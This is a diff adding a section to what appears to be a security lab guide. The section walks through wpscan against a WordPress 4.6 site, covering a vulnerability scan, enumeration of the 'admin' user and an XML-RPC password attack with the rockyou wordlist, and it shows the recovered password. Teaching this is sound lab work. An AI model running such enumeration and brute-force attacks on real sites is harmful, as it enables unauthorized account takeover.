@@ -217,3 +217,147 @@ Configure the following **Admin Account Information** details: **Before proceedi
 Finish the installation guide and click CMSMS admin panel. **Login as admin and take a screenshot of the CMSMS admin penel.**
 
 <img src="images/cms-install2.png" width="900" height="900">
+
+## Wpscan and the WordPress site
+This section uses wpscan to:
+1. Scan the WordPress site for vulnerabilities.
+2. Enumerate WordPress users.
+3. Run a password attack against discovered WordPress users.
+
+Start with a basic wpscan:
+```
+wpscan --url http://104.198.70.155:10000/ 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://104.198.70.155:10000/ [104.198.70.155]
+[+] Started: Mon Sep 19 23:58:36 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.7 (Ubuntu)
+ |  - X-Powered-By: PHP/5.5.9-1ubuntu4.21
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://104.198.70.155:10000/xmlrpc.php
+ | Found By: Link Tag (Passive Detection)
+ | Confidence: 100%
+ | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://104.198.70.155:10000/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://104.198.70.155:10000/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.6 identified (Insecure, released on 2016-08-16).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://104.198.70.155:10000/?feed=rss2, <generator>https://wordpress.org/?v=4.6</generator>
+ |  - http://104.198.70.155:10000/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.6</generator>
+
+[+] WordPress theme in use: twentyfifteen
+ | Location: http://104.198.70.155:10000/wp-content/themes/twentyfifteen/
+ | Last Updated: 2022-05-24T00:00:00.000Z
+ | Readme: http://104.198.70.155:10000/wp-content/themes/twentyfifteen/readme.txt
+ | [!] The version is out of date, the latest version is 3.2
+ | Style URL: http://104.198.70.155:10000/wp-content/themes/twentyfifteen/style.css?ver=4.6
+ | Style Name: Twenty Fifteen
+ | Style URI: https://wordpress.org/themes/twentyfifteen/
+ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.6 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://104.198.70.155:10000/wp-content/themes/twentyfifteen/style.css?ver=4.6, Match: 'Version: 1.6'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 <=====================================================================> (137 / 137) 100.00% Time: 00:00:04
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon Sep 19 23:58:49 2022
+[+] Requests Done: 186
+[+] Cached Requests: 5
+[+] Data Sent: 47.431 KB
+[+] Data Received: 19.039 MB
+[+] Memory used: 238.41 MB
+[+] Elapsed time: 00:00:13
+```
+
+We could run a more aggressive scan with the option **--detection-mode aggressive**, but we will instead move on to user enumeration.
+
+Run the default scan with the option **--enumerate u**.
+
+```
+wpscan --url http://104.198.70.155:10000/ --enumerate u
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <======================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+```
+We successfully identified a user, admin. Next, use wpscan to run a password attack using the rockyou.txt wordlist.
+
+```
+wpscan --url http://104.198.70.155:10000/ --enumerate u --passwords /usr/share/wordlists/rockyou.txt
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - admin / marlon                                                                                                                          
+Trying admin / marlon Time: 00:00:55 <                                                                      > (505 / 14344897)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: marlon
+```
+**Capture a screenshot of the successful wpscan password attack.**
